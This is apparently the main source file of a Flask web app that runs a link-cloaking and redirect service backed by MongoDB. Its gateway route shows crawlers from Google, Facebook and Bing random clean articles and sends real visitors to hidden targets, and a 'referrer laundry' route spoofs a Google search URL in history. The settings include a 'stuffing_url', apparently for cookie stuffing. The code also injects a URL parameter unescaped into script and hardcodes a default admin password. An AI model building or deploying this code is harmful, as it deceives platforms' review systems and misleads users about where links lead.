# app.py
import os, re, json, random
from flask import Flask, render_template_string, request, redirect, Response
from pymongo import MongoClient
from bson.objectid import ObjectId
from content_library import ARTICLES
import templates

app = Flask(__name__)

# --- Database Connection & Cleaning ---
raw_uri = os.getenv("MONGO_URI", "").strip()
MONGO_URI = re.sub(r'[\s\n\r]', '', raw_uri)
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "himsounin1$")

client = MongoClient(MONGO_URI)
db = client['elite_kraken_system_v7']
links_col = db['links']
settings_col = db['settings']

def get_settings():
    s = settings_col.find_one({"type": "global"})
    if not s:
        default = {"type": "global", "stuffing_url": "", "exit_url": ""}
        settings_col.insert_one(default)
        return default
    return s

# --- Public Gateway Route ---
@app.route('/v/<slug>')
def gateway(slug):
    ua = request.headers.get('User-Agent', '').lower()
    # Cloaking: Show clean content to bots/crawlers
    if any(bot in ua for bot in ["google", "facebook", "bing", "bot", "crawler"]):
        art = random.choice(ARTICLES)
        return f"<html><body><h1>{art['title']}</h1><p>{art['body']}</p></body></html>"
    
    link = links_col.find_one({"slug": slug})
    if not link: return "Link Expired", 404
    
    links_col.update_one({"slug": slug}, {"$inc": {"clicks": 1}})
    return render_template_string(
        templates.LANDING_HTML, 
        target_url=link['target_url'], 
        s=get_settings(), 
        article=random.choice(ARTICLES),
        slug=slug
    )

# --- Referrer Laundry & Google Spoofing ---
@app.route('/redirect')
def laundry():
    url = request.args.get('url')
    if not url: return redirect('/')
    # The Elite Google Referrer Spoofing Protocol
    return f'''
    <html><head><meta name="referrer" content="no-referrer">
    <script>
        history.replaceState(null, null, "https://www.google.com/search?q=secure+resource+access+gateway+verification");
        setTimeout(function(){{ window.location.replace("{url}"); }}, 100);
    </script></head>
    <body style="background:#fff;"></body></html>
    '''

# --- Admin Routes ---
@app.route('/admin')
def admin():
    if request.args.get('pw') != ADMIN_PASSWORD: return "Denied", 403
    links = list(links_col.find().sort("_id", -1))
    return render_template_string(templates.ADMIN_HTML, links=links, s=get_settings(), host_url=request.host_url)

@app.route('/admin/create_link', methods=['POST'])
def create_link():
    title = request.form['title']
    target = request.form['target_url']
    # Generate unique URL friendly slug
    slug = re.sub(r'[^a-z0-9]', '-', title.lower()).strip('-') + "-" + os.urandom(2).hex()
    links_col.insert_one({"title": title, "target_url": target, "slug": slug, "clicks": 0})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

@app.route('/admin/update_settings', methods=['POST'])
def update_settings():
    settings_col.update_one({"type": "global"}, {"$set": {
        "stuffing_url": request.form['stuffing_url'],
        "exit_url": request.form['exit_url']
    }})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

@app.route('/admin/delete/<id>')
def delete_link(id):
    links_col.delete_one({"_id": ObjectId(id)})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
